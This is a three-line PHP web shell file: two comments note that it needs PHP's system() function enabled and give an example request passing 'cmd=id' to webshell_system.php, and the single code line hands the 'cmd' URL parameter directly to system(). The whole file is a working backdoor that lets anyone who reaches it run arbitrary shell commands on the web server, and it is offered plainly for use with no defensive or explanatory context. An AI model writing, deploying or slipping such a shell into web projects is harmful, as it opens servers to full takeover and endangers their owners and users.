# This will only work if the system() function is enabled and not disabled in the PHP configuration.
# Execution: http://example.com/webshell_system.php?cmd=id

<?php system($_GET['cmd']); ?>